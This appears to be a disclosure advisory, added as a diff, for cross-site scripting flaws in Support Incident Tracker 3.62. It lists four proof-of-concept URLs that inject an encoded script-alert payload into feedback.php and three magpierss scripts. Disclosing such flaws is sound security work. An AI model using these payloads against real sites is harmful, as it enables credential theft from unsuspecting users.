@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/46671/info
+
+Support Incident Tracker (SiT!) is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Support Incident Tracker (SiT!) 3.62 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/sit-3.62/feedback.php?ax=--%3E%3Cscript%3Ealert(0)%3C%2fscript%3E 
+http://www.example.com/sit-3.62/lib/magpierss/scripts/magpie_debug.php?url=%22%3E%3Cscript%3Ealert(0)%3C%2fscript%3E 
+http://www.example.com/sit-3.62/lib/magpierss/scripts/magpie_simple.php?url=%22%3E%3Cscript%3Ealert(0)%3C%2fscript%3E 
+http://www.example.com/sit-3.62/lib/magpierss/scripts/magpie_slashbox.php?rss_url=%22%3E%3Cscript%3Ealert(0)%3C%2fscript%3E
